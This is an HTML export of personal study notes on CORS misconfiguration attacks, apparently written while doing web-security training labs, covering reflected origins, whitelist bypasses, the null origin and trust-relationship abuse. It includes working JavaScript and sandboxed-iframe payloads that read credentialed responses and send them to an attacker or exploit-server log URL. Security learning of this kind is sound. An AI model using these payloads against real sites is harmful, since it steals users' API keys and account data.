<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Vulnerabilities</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Vulnerabilities</h1><br/><strong>Overview</strong><br />• Mistakes often made with how CORS is configured which leads to vulnerabilities<br /><br /><strong>Server-Generated ACAO header from client-specified Origin header</strong><br />• When applications just want to allow access to any website, they mirror the request origin in the response ACAO<br />• Can be an issue, especially if you have set ACAC to true<br />   ◇ Add origin header with random origin to see if it is reflected in the response, then try and exploit.<br />   ◇ Make naughty requests and relocate info to your malicious server.<br />• Naughty JS that uses CORS to retrieve Admin API key and uploads to exploit server:<br /><code>var req = new XMLHttpRequest();<br />   req.onload = reqListener;<br />   req.open(&#39;get&#39;,&#39;https://vulnerable-website.com/sensitive-victim-data&#39;,true);<br />   req.withCredentials = true;<br />   req.send();<br /><br />   function reqListener() {<br />       location=&#39;//malicious-website.com/log?key=&#39;+this.responseText;<br />   };  <br />   <br /></code><br /><strong>Errors parsing Origin headers</strong><br />• When Whitelist is employed, request host is checked against whitelist<br />• Mistakes can be made in the whitelist<br />   ◇ Some orgs allow access from all their subdomains (including non-existant ones)<br />   ◇ Done using regular expressions<br />• Try variations of an accepted website. E.G&gt; normal-website.com<br />   ◇ hackersnormal-website.com<br />   ◇ normal-website.com.evil-user.net<br /><br /><strong>Whitelisted null origin value</strong><br />• Browsers send null value in origin when:<br />   ◇ Cross-sit redirects<br />   ◇ Requests from serialised data<br />   ◇ request using the file: protocol<br />   ◇ sandboxed cross-origin requests<br />• Some apps whitelist “null” origin<br />• TRY sending the null origin<br />   ◇ If you recieve the null ACAO back, it may have whitelisted null values?<br />   ◇ Then you use some scripting on exploit server to access API keys etc.<br />   ◇ contain null value in an iFrame to be sneaky (since iFrame origin is null)<br />      ▪ Put script inside of first iFrame bracket (script from above)<br /><code>&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,&lt;script&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;     </code><br /><br /><code>&lt;iframe sandbow=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,<br />&lt;script&gt;<br />var req = new XMLHttpRequest();<br />   req.onload = reqListener;<br />   req.open(&#39;get&#39;,&#39;</code><a href="https://acb91f5b1eb139e0801918c6005b00c0.web-security-academy.net/accountDetails',true);">https://acb91f5b1eb139e0801918c6005b00c0.web-security-academy.net/accountDetails&#39;,true);</a><code><br />   req.withCredentials = true;<br />   req.send();<br /><br />   function reqListener() {<br />       location=&#39;</code><a href="https://ac0d1fe01ecb39a1801118e701aa00a3.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);">https://ac0d1fe01ecb39a1801118e701aa00a3.web-security-academy.net/log?key=&#39;+encodeURIComponent(this.responseText);</a><code><br />   };  <br />&lt;/script&gt;&quot;<br />&gt;<br />&lt;/iframe&gt;</code><br /><br /><strong>Exploiting XSS via CORS trust relationship</strong><br />• Trust relationship developed between 2 origins<br />• if website trusts vulnerable website, can be dangerous for the safe websote<br />• Inject JS that uses CORS to steal info.<br /><br /><strong>Breaking TLS with poorly configured CORS</strong><br />• If HTTPS site trusts (whitelists) HTTP website, HTTP site can make a request for sensitive info<br />• Attack in position to intercept victim user&#39;s traffic can exploit CORS configuration to steal info<br />• STEPS (MITM):<br />   ◇ Victim HTTP request<br />   ◇ Attack injects redirection to <a href="http://trusted-subdomain.vulnerable-website.com">http://trusted-subdomain.vulnerable-website.com</a><br />   ◇ victims browser follows redirect<br />   ◇ attacker intercepts http request, returns spoofed response w/ CORS request<br />   ◇ victim browser makes CORS request with new origin<br />   ◇ app allows request<br /><span style="text-decoration:underline;">Better Steps</span><br />• Play around with site and look for relationships between different sites<br />• Look for ACAC and ACAO<br />• If HTTPS request HTTP, make not of HTTP.<br />• Find a place where you want to gather details, intercept request<br />• Try variations of subdomain + attack or attack + subdomain to work out how the cors is configured (which URLS are whitelisted (regex)) and make this the origin.<br />• Find vulnerability in another area where you can inject (XSS?)<br />• Use JS on exploit server to exploit vuln (make sure to include doc.location with your naughty URL you used earlier<br />   ◇ Should take the form of: &lt;script document.location=&quot;URL.com/&lt;script&gt;...&lt;/script&gt;&quot;&lt;/script&gt;<br />   ◇ If it doesn&#39;t work, look at HTML encoding<br /><br /><strong>Intranets and CORS without credentials</strong><br />• CORS attacks often rely on ACAC True<br />   ◇ Allows the sending of cookies<br />• Often case you can&#39;t access intranet without credentials (IP blocking)<br />• BUT, internal websites often have lower security standards<br />• What if an authenticated user accesses external website THEN an internal one?<br />   ◇ Could MITM this and get credentials to access internet.</div></body></html>